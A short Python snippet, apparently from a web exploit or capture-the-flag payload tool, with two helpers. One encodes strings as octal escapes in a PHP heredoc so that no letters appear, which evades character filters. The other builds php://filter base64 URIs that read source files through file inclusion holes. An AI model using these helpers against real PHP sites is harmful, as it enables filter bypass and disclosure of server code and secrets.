def heredoc_string(string: str):
    """A string without using a-zA-Z"""
    octal_string = "".join([
        oct(ord(letter)).replace('0o', '\\')
        for letter in string
    ])
    return f"""(<<<_
{octal_string}
_)"""

def php_filter(resource: str):
    return f"php://filter/convert.base64-encode/resource={resource}"
